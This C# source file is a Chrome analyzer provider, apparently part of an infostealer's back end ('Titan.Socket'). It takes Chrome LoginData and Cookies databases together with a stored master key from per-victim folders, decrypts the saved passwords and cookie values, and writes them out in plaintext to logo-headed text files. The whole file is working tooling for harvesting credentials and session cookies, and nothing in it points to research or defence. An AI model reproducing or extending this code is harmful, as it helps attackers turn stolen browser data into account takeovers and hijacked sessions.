using Microsoft.Data.Sqlite;
using System.Text;
using Titan.Socket.Analyzer.Contracts;
using Titan.Socket.Analyzer.Records;
using Titan.Socket.Terminal;

namespace Titan.Socket.Analyzer.Providers
{
    internal class GoogleChromeAnalyzerProvider : IAnalyzeProvider
    {
        private List<LoginCredentials> Credentials = new();
        private List<CookieRecord> Cookies = new();

        public void Analyze(string type, string tag, string userRootFolder, string file)
        {
            if(Path.GetFileName(file).Contains("LoginData"))
            {
                ProcessLoginData(tag, userRootFolder, file);
            }

            if(Path.GetFileName(file).Contains("Cookies"))
            {
                ProcessCookies(tag, userRootFolder, file);
            }
        }

        public bool Can(string type, string tag)
        {
            return tag == "Google Chrome";
        }


        //public bool Can(string type, string tag)
        //{
        //    string[] values = { "Google Chrome", "Microsoft Edge" };

        //    foreach (string value in values)
        //    {
        //        if (tag == value)
        //        {
        //            return true;
        //        }
        //    }
        //    return false; 
        //}

        private byte[] MasterKey(string tag, string userRootFolder)
        {
            string file_name = userRootFolder + "\\" + tag + "\\Browser\\MasterKey";
            
            if(File.Exists(file_name))
            {
                return Convert.FromBase64String(File.ReadAllLines(file_name)[0]);
            }

            return Array.Empty<byte>();
        }

        private void ProcessCookies(string tag, string userRootFolder, string file)
        {
            Cookies.Clear();

            var key = MasterKey(tag, userRootFolder);

            if (key.Length <= 0)
            {
                return;
            }

            using SqliteConnection connection = new($"Data Source={file}");
            var cmd = new SqliteCommand("select * from cookies", connection);

            connection.Open();
            using SqliteDataReader reader = cmd.ExecuteReader();

            if (reader.HasRows)
            {
                while (reader.Read())
                {
                    byte[] encryptedData = (byte[])reader["encrypted_value"];
                    string value = AnalyzerUtils.DynamicDecrypt(encryptedData, key);

                    Cookies.Add(new((string)reader["host_key"], (string)reader["name"], value, (string)reader["path"]));
                }
            }

            connection.Close();

            if (Cookies.Count > 0)
            {
                var cookies_txt = userRootFolder + "\\" /*+ "Cookies" + "\\"*/ + "Cookies_" + tag + ".txt";

                if (File.Exists(cookies_txt))
                {
                    try
                    {
                        File.Delete(cookies_txt);
                    }
                    catch
                    {
                        TerminalService.Error($"Cannot delete: {cookies_txt} because file was busy in other process!");
                        cookies_txt = cookies_txt + "__" + Guid.NewGuid().ToString();
                        TerminalService.Error($"Current analyze results saved to: {cookies_txt}");
                    }
                }

                string[] logo = AnalyzerUtils.GetLogo(Path.GetFileName(cookies_txt));
                string[] line = new string[Cookies.Count];

                for (var i = 0; i < line.Length; i++)
                {
                    line[i] = Cookies[i].ToString();
                }

                string[] content = new string[logo.Length + line.Length];

                logo.CopyTo(content, 0);
                line.CopyTo(content, logo.Length);

                // Create New File
                File.WriteAllLines(cookies_txt, content);
            }
        }

        private void ProcessLoginData(string tag, string userRootFolder, string file)
        {
            Credentials.Clear();

            var key = MasterKey(tag, userRootFolder);

            if(key.Length <= 0)
            {
                return;
            }

            using SqliteConnection connection = new($"Data Source={file}");

            var cmd = new SqliteCommand("select * from logins", connection);

            connection.Open();
            using SqliteDataReader reader = cmd.ExecuteReader();

            if (reader.HasRows)
            {
                while (reader.Read())
                {
                    byte[] encryptedData = (byte[])reader["password_value"];
                    string password = AnalyzerUtils.DynamicDecrypt(encryptedData, key);

                    Credentials.Add(new LoginCredentials((string)reader["origin_url"], (string)reader["username_value"], password));
                }
            }

            connection.Close();

            if (Credentials.Count > 0)
            {
                var passwords_txt = userRootFolder + "\\"+ /*"Passwords" + "\\" +*/ "Passwords_"+ tag + ".txt";
                
                if(File.Exists(passwords_txt))
                {
                    try
                    {
                        File.Delete(passwords_txt);
                    }
                    catch
                    {
                        TerminalService.Error($"Cannot delete: {passwords_txt} because file was busy in other process!");
                        passwords_txt = passwords_txt + "__" + Guid.NewGuid().ToString();
                        TerminalService.Error($"Current analyze results saved to: {passwords_txt}");
                    }
                }

                string[] logo = AnalyzerUtils.GetLogo(Path.GetFileName(passwords_txt));
                string[] line = new string[Credentials.Count];

                for(var i = 0; i < line.Length; i++)
                {
                    line[i] = Credentials[i].ToString();
                }

                string[] content = new string[logo.Length + line.Length];

                logo.CopyTo(content, 0);
                line.CopyTo(content, logo.Length);

                // Create New File
                File.WriteAllLines(passwords_txt, content);
            }
        }
    }
}
